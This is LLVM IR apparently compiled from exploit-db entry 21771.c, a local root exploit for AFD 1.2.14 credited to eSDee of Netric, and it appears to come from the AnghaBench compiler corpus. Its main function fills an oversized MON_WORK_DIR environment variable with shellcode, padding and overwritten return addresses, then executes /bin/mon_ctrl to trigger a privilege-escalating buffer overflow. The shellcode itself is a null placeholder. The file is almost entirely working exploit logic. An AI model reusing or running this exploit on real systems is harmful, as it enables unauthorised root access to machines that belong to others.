; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21771.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_21771.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [14 x i8] c"MON_WORK_DIR=\00", align 1
@shellcode = common dso_local global i8* null, align 8
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [67 x i8] c"AFD 1.2.14 local root exploit by eSDee of Netric (www.netric.org)\0A\00", align 1
@.str.2 = private unnamed_addr constant [67 x i8] c"-----------------------------------------------------------------\0A\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c"Ret    = 0x%08x\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"Retloc = 0x%08x\0A\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"/bin/mon_ctrl\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"mon_ctrl\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1135 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1073749152, i32* %7, align 4
  store i32 134672416, i32* %8, align 4
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 1
  br i1 %10, label %11, label %18

11:                                               ; preds = %2
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  %14 = load i8*, i8** %13, align 8
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = call i32 @strtoul(i8* %14, i8** %16, i32 16)
  store i32 %17, i32* %7, align 4
  br label %18

18:                                               ; preds = %11, %2
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 2
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 2
  %27 = call i32 @strtoul(i8* %24, i8** %26, i32 16)
  store i32 %27, i32* %8, align 4
  br label %28

28:                                               ; preds = %21, %18
  %29 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 0
  %30 = call i32 @memset(i8* %29, i32 65, i32 1135)
  %31 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 0
  %32 = call i32 @memcpy(i8* %31, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i32 13)
  %33 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 0
  %34 = getelementptr inbounds i8, i8* %33, i64 13
  %35 = load i8*, i8** @shellcode, align 8
  %36 = load i8*, i8** @shellcode, align 8
  %37 = call i32 @strlen(i8* %36)
  %38 = call i32 @memcpy(i8* %34, i8* %35, i32 %37)
  %39 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1117
  store i8 -1, i8* %39, align 1
  %40 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1118
  store i8 -1, i8* %40, align 2
  %41 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1119
  store i8 -1, i8* %41, align 1
  %42 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1120
  store i8 -1, i8* %42, align 16
  %43 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1121
  store i8 -4, i8* %43, align 1
  %44 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1122
  store i8 -1, i8* %44, align 2
  %45 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1123
  store i8 -1, i8* %45, align 1
  %46 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1124
  store i8 -1, i8* %46, align 4
  %47 = load i32, i32* %7, align 4
  %48 = and i32 %47, 255
  %49 = trunc i32 %48 to i8
  %50 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1126
  store i8 %49, i8* %50, align 2
  %51 = load i32, i32* %7, align 4
  %52 = and i32 %51, 65280
  %53 = lshr i32 %52, 8
  %54 = trunc i32 %53 to i8
  %55 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1127
  store i8 %54, i8* %55, align 1
  %56 = load i32, i32* %7, align 4
  %57 = and i32 %56, 16711680
  %58 = lshr i32 %57, 16
  %59 = trunc i32 %58 to i8
  %60 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1128
  store i8 %59, i8* %60, align 8
  %61 = load i32, i32* %7, align 4
  %62 = and i32 %61, -16777216
  %63 = lshr i32 %62, 24
  %64 = trunc i32 %63 to i8
  %65 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1129
  store i8 %64, i8* %65, align 1
  %66 = load i32, i32* %8, align 4
  %67 = and i32 %66, 255
  %68 = trunc i32 %67 to i8
  %69 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1130
  store i8 %68, i8* %69, align 2
  %70 = load i32, i32* %8, align 4
  %71 = and i32 %70, 65280
  %72 = lshr i32 %71, 8
  %73 = trunc i32 %72 to i8
  %74 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1131
  store i8 %73, i8* %74, align 1
  %75 = load i32, i32* %8, align 4
  %76 = and i32 %75, 16711680
  %77 = lshr i32 %76, 16
  %78 = trunc i32 %77 to i8
  %79 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1132
  store i8 %78, i8* %79, align 4
  %80 = load i32, i32* %8, align 4
  %81 = and i32 %80, -16777216
  %82 = lshr i32 %81, 24
  %83 = trunc i32 %82 to i8
  %84 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1133
  store i8 %83, i8* %84, align 1
  %85 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 1134
  store i8 0, i8* %85, align 2
  %86 = getelementptr inbounds [1135 x i8], [1135 x i8]* %6, i64 0, i64 0
  %87 = call i32 @putenv(i8* %86)
  %88 = load i32, i32* @stdout, align 4
  %89 = call i32 (i32, i8*, ...) @fprintf(i32 %88, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.1, i64 0, i64 0))
  %90 = load i32, i32* @stdout, align 4
  %91 = call i32 (i32, i8*, ...) @fprintf(i32 %90, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.2, i64 0, i64 0))
  %92 = load i32, i32* @stdout, align 4
  %93 = load i32, i32* %8, align 4
  %94 = call i32 (i32, i8*, ...) @fprintf(i32 %92, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i32 %93)
  %95 = load i32, i32* @stdout, align 4
  %96 = load i32, i32* %7, align 4
  %97 = call i32 (i32, i8*, ...) @fprintf(i32 %95, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i32 %96)
  %98 = call i32 @execl(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i32* null)
  ret i32 0
}

declare dso_local i32 @strtoul(i8*, i8**, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
